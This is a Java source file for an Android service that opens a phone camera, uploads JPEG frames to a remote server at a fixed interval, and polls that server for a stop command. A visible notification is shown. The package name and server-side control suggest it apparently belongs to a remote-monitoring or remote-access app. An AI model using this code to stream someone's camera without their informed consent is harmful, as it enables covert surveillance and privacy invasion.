package com.panellord;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;
import android.util.Size;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.ScheduledFuture;
import java.util.concurrent.TimeUnit;

public class CameraStreamService extends Service {
    private static final String TAG = "CameraStreamService";
    public static final String ACTION_START = "com.panellord.CAMERA_START";
    public static final String ACTION_STOP  = "com.panellord.CAMERA_STOP";
    public static final String EXTRA_FACING = "facing";  // "front" or "back"

    private String deviceId;
    private String facing = "back";
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader imageReader;
    private HandlerThread cameraThread;
    private Handler cameraHandler;
    private ScheduledExecutorService scheduler;
    private ScheduledFuture<?> frameTask;

    @Override
    public void onCreate() {
        super.onCreate();
        deviceId = DeviceIdManager.getDeviceId(this);
        scheduler = Executors.newSingleThreadScheduledExecutor();
        cameraThread = new HandlerThread("CameraThread");
        cameraThread.start();
        cameraHandler = new Handler(cameraThread.getLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_NOT_STICKY;
        String action = intent.getAction();

        if (ACTION_START.equals(action)) {
            facing = intent.getStringExtra(EXTRA_FACING);
            if (facing == null) facing = "back";
            startForeground(Config.NOTIF_ID_CAMERA, buildNotif());
            openCamera();
            frameTask = scheduler.scheduleAtFixedRate(this::uploadFrame,
                    1000, Config.CAMERA_FRAME_INTERVAL_MS, TimeUnit.MILLISECONDS);
        } else if (ACTION_STOP.equals(action)) {
            stopCamera();
            stopSelf();
        }
        return START_NOT_STICKY;
    }

    @SuppressLint("MissingPermission")
    private void openCamera() {
        try {
            CameraManager cm = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String cameraId = null;
            int targetFacing = "front".equals(facing)
                    ? CameraCharacteristics.LENS_FACING_FRONT
                    : CameraCharacteristics.LENS_FACING_BACK;

            for (String id : cm.getCameraIdList()) {
                CameraCharacteristics chars = cm.getCameraCharacteristics(id);
                Integer lensFacing = chars.get(CameraCharacteristics.LENS_FACING);
                if (lensFacing != null && lensFacing == targetFacing) {
                    cameraId = id;
                    break;
                }
            }
            if (cameraId == null) cameraId = cm.getCameraIdList()[0];

            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);

            final String finalId = cameraId;
            cm.openCamera(finalId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(CameraDevice camera) {
                    cameraDevice = camera;
                    startCapture();
                }
                @Override
                public void onDisconnected(CameraDevice camera) { camera.close(); }
                @Override
                public void onError(CameraDevice camera, int error) {
                    camera.close();
                    Log.e(TAG, "Camera error: " + error);
                }
            }, cameraHandler);
        } catch (Exception e) {
            Log.e(TAG, "Failed to open camera", e);
        }
    }

    private void startCapture() {
        try {
            cameraDevice.createCaptureSession(
                    Arrays.asList(imageReader.getSurface()),
                    new CameraCaptureSession.StateCallback() {
                        @Override
                        public void onConfigured(CameraCaptureSession session) {
                            captureSession = session;
                            try {
                                CaptureRequest.Builder builder =
                                        cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                                builder.addTarget(imageReader.getSurface());
                                session.setRepeatingRequest(builder.build(), null, cameraHandler);
                            } catch (Exception e) {
                                Log.e(TAG, "Capture request error", e);
                            }
                        }
                        @Override
                        public void onConfigureFailed(CameraCaptureSession session) {
                            Log.e(TAG, "Camera config failed");
                        }
                    }, cameraHandler);
        } catch (Exception e) {
            Log.e(TAG, "startCapture error", e);
        }
    }

    private void uploadFrame() {
        Image image = null;
        try {
            // Check if server wants us to stop
            String cmd = ApiClient.get("/device/camera/command/" + deviceId);
            if (cmd != null && cmd.contains("\"stop\"")) {
                stopCamera(); stopSelf(); return;
            }

            image = imageReader.acquireLatestImage();
            if (image == null) return;

            ByteBuffer buf = image.getPlanes()[0].getBuffer();
            byte[] bytes = new byte[buf.remaining()];
            buf.get(bytes);

            ApiClient.postJpeg("/device/camera/frame/" + deviceId, bytes);
        } catch (Exception e) {
            Log.e(TAG, "uploadFrame error", e);
        } finally {
            if (image != null) image.close();
        }
    }

    private void stopCamera() {
        if (frameTask != null) { frameTask.cancel(true); frameTask = null; }
        if (captureSession != null) { captureSession.close(); captureSession = null; }
        if (cameraDevice != null)   { cameraDevice.close(); cameraDevice = null; }
        if (imageReader != null)    { imageReader.close(); imageReader = null; }
    }

    @Override
    public void onDestroy() { super.onDestroy(); stopCamera(); }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    private Notification buildNotif() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, Config.NOTIF_CHANNEL);
        } else {
            builder = new Notification.Builder(this);
        }
        return builder.setContentTitle("Camera Active")
                .setContentText("Camera stream running")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .build();
    }
}
